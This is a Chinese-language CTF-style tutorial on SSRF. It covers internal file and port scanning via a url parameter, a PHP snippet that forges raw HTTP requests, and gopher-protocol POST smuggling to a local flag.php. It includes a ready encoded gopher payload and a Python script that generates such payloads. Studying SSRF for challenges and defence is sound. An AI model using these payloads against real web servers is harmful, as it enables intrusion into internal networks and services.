
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等

SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器


## 文件扫描

扫描?url=127.0.0.1/x

## 端口扫描

通过服务器访问内网地址，直接用bp爆破url传参中的端口即可：127.0.0.1:x

## 发送包

```
当遇到
$fp=fsockopen($host,intval($port),$error,$errstr,30);//建立socket连接
fwrite($fp,$data);//写进我们的会话中的

我们需要以http请求访问一个网站时，需要伪造请求头写入会话
<?php
$out = "GET /flag.php HTTP/1.1\r\n";
$out .= "Host: 127.0.0.1\r\n";
$out .= "Connection: Keep-Alive\r\n\r\n";
echo $out;
echo base64_encode($out)
?>

```



## POST请求（gopher协议）

如果在x.php可以利用curl传url（也支持http和file协议），那么我们可以用gopher协议在x.php中构造post请求包往flag.php传key值，以此获取flag

gopher协议默认端口为70，需要指定POST方法，回车换行需要使用%0d%0a,而且POST参数之间的&分隔符也需要URL编码
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=d93819c4c1a18dc606dc5c6486f77227
```
gopher的数据需要用url编码多次之后再发送，且第一次编码后%0A需全部替换成%0D%0A，现在进行编码
content-lenght为key值长度

**gopher使用结构gopher://127.0.0.1:80/_{TCP/IP数据流}**

（下划线的原因是gopher协议回吃掉第一个url后的字符）

以下为注入样例
```
url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D0bd5e192bb3c5e0f3df6b8ddf4252d9c
```

生成脚本

```
# -*- coding: UTF-8 -*-
#coding: utf-8
import urllib.parse
s=''
ss='''POST / HTTP/1.1
Host: 127.0.0.1:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://node5.anna.nssctf.cn:28344
Connection: close
Referer: http://node5.anna.nssctf.cn:28344/
Upgrade-Insecure-Requests: 1

url=http://127.0.0.1/flag.php'''
for i in ss:

    if len(str(hex(ord(i))[2:]))>=2:
        s+=str(hex(ord(i))[2:])
    else:
        s+='0'+str(hex(ord(i))[2:])
s=s.replace('0a','0d0a')
#print(s)

strrr=''
len=len(s)
p=''
for i in range(len)[::2]:
    p+=urllib.parse.quote(chr(int(s[i:i+2],16)))
    strrr+=chr(int(s[i:i+2],16))
#print(strrr)
urlp = urllib.parse.quote(p)
urlp = 'gopher://127.0.0.1:80/_' + urlp
print(urlp)
```

